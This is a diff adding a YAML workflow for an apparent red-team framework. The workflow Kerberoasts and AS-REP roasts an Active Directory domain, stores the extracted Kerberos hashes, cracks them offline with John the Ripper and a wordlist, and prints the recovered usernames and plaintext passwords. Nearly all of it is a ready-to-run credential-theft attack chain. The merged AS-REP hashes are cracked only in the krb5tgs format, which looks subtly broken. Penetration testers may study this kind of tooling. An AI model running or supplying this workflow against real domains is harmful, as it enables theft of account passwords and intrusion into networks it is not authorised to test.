@@ -1,0 +1,174 @@
+name: ad-kerberoast-task
+description: |
+  Task-based Kerberoast and AS-REP Roast workflow — uses structured task
+  steps for Kerberoasting (GetUserSPNs) and AS-REP roasting (GetNPUsers)
+  with automatic credential storage, then cracks extracted hashes offline.
+tags: [redteam, ad, kerberos, kerberoast, asrep, task]
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Domain controller IP or hostname
+      alias: t
+    domain:
+      required: true
+      type: string
+      description: Domain name (e.g. corp.local)
+    user:
+      required: true
+      type: string
+      description: Domain username
+    password:
+      type: string
+      default: ''
+      description: Password (provide password or hash)
+    hash:
+      type: string
+      default: ''
+      description: NTLM hash for pass-the-hash (LM:NT format)
+    wordlist:
+      type: string
+      default: /usr/share/wordlists/rockyou.txt
+      description: Wordlist for offline hash cracking
+
+defaults:
+  store-creds: true
+
+jobs:
+  kerberoast:
+    name: Kerberoasting (GetUserSPNs)
+    outputs:
+      hash_file: '{{ steps["save-hashes"].outputs.hash_file | default("", true) }}'
+      hash_count: '{{ steps["save-hashes"].outputs.hash_count | default("", true) }}'
+    steps:
+      - task: getuserspns
+        timeout: 10
+        name: get-spn-tickets
+        with:
+          target: "{{ inputs.domain }}"
+          username: "{{ inputs.user }}"
+          password: "{{ inputs.password }}"
+          hash: "{{ inputs.hash }}"
+          dc_ip: "{{ inputs.target }}"
+          request: true
+        continue-on-error: true
+        log-stdout: true
+      - name: save-hashes
+        script: |
+          creds = {{ users(steps["get-spn-tickets"].outputs.typed_outputs) | tojson }}
+
+          hash_lines = []
+          for c in creds:
+              h = c.get('hash', '')
+              if h:
+                  hash_lines.append(h)
+
+          hash_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_kerberoast_hashes.txt"
+          with open(hash_file, 'w') as f:
+              f.write('\n'.join(hash_lines))
+
+          add_outputs(hash_file=hash_file, hash_count=len(hash_lines))
+          print(f"[+] Kerberoasting complete: {len(hash_lines)} TGS hashes extracted")
+          for c in creds:
+              print(f"  [*] {c.get('username', 'unknown')}@{c.get('domain', '')}")
+
+  asrep-roast:
+    name: AS-REP Roasting (GetNPUsers)
+    outputs:
+      hash_file: '{{ steps["save-asrep"].outputs.hash_file | default("", true) }}'
+      hash_count: '{{ steps["save-asrep"].outputs.hash_count | default("", true) }}'
+    steps:
+      - task: getnpusers
+        timeout: 10
+        name: get-asrep-hashes
+        with:
+          target: "{{ inputs.domain }}"
+          username: "{{ inputs.user }}"
+          password: "{{ inputs.password }}"
+          hash: "{{ inputs.hash }}"
+          dc_ip: "{{ inputs.target }}"
+          request: true
+          format: hashcat
+        continue-on-error: true
+        log-stdout: true
+      - name: save-asrep
+        script: |
+          creds = {{ users(steps["get-asrep-hashes"].outputs.typed_outputs) | tojson }}
+
+          hash_lines = []
+          for c in creds:
+              h = c.get('hash', '')
+              if h:
+                  hash_lines.append(h)
+
+          hash_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_asrep_hashes.txt"
+          with open(hash_file, 'w') as f:
+              f.write('\n'.join(hash_lines))
+
+          add_outputs(hash_file=hash_file, hash_count=len(hash_lines))
+          print(f"[+] AS-REP roast complete: {len(hash_lines)} hashes extracted")
+          for c in creds:
+              print(f"  [*] {c.get('username', 'unknown')}@{c.get('domain', '')}")
+
+  crack:
+    name: Offline Hash Cracking
+    needs: [kerberoast, asrep-roast]
+    steps:
+      - name: merge-hashes
+        script: |
+          from pathlib import Path
+
+          merged = []
+
+          kerb_file = '{{ jobs.kerberoast.outputs.hash_file }}'
+          asrep_file = '{{ jobs["asrep-roast"].outputs.hash_file }}'
+
+          for f in [kerb_file, asrep_file]:
+              try:
+                  merged.extend(line.strip() for line in Path(f).read_text().splitlines() if line.strip())
+              except Exception:
+                  pass
+
+          merged_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_all_kerberos_hashes.txt"
+          Path(merged_file).write_text('\n'.join(merged))
+          add_outputs(merged_file=merged_file, total_hashes=len(merged))
+          print(f"[+] Merged {len(merged)} hashes for cracking")
+      - task: john
+        timeout: 30
+        name: john-crack
+        with:
+          target: "{{ steps['merge-hashes'].outputs.merged_file }}"
+          wordlist: "{{ inputs.wordlist }}"
+          format: krb5tgs
+        continue-on-error: true
+        log-stdout: true
+      - task: john
+        timeout: 5
+        name: john-show
+        with:
+          target: "{{ steps['merge-hashes'].outputs.merged_file }}"
+          format: krb5tgs
+          show: true
+        continue-on-error: true
+        log-stdout: true
+      - name: crack-summary
+        script: |
+          cracked = {{ users(steps["john-show"].outputs.typed_outputs) | tojson }}
+
+          print("=" * 50)
+          print(" KERBEROS HASH CRACKING RESULTS")
+          print("=" * 50)
+          print(f"  Total hashes: {{ steps['merge-hashes'].outputs.total_hashes }}")
+          print(f"  Cracked:      {len(cracked)}")
+          print("")
+
+          for c in cracked:
+              user = c.get('username', 'unknown')
+              pw = c.get('password', '')
+              print(f"  [+] {user} : {pw}")
+
+          if not cracked:
+              print("  [-] No hashes cracked with current wordlist")
+              print(f"      Wordlist: {{ inputs.wordlist }}")
+        log-stdout: true
